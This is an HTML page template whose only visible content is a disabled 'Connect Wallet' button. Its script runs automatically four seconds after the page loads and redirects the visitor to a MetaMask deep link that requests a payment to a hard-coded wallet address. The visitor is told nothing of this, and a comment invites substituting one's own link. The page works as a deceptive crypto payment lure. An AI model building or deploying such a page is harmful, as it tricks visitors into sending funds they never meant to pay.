<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto-Trigger Metamask Link</title>
    <style>
        /* Style for the button */
        .metamask-button {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background-color: #007BFF;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <!-- JavaScript to redirect to Metamask link after 4 seconds -->
    <script>
        function redirectToMetamaskLink() {
            // Replace this URL with your Metamask link
            var metamaskLink = "https://metamask.app.link/send/pay-0x62842A4A9d0f6c56D0F1757E13A8Efdd4E7B8BD2?value=1e16";
            window.location.href = metamaskLink;
        }

        // Automatically trigger the redirection after 4 seconds
        setTimeout(redirectToMetamaskLink, 4000); // 4000 milliseconds = 4 seconds
    </script>

    <!-- Static "Connect Wallet" button -->
    <button class="metamask-button" disabled>Connect Wallet</button>
</body>
</html>
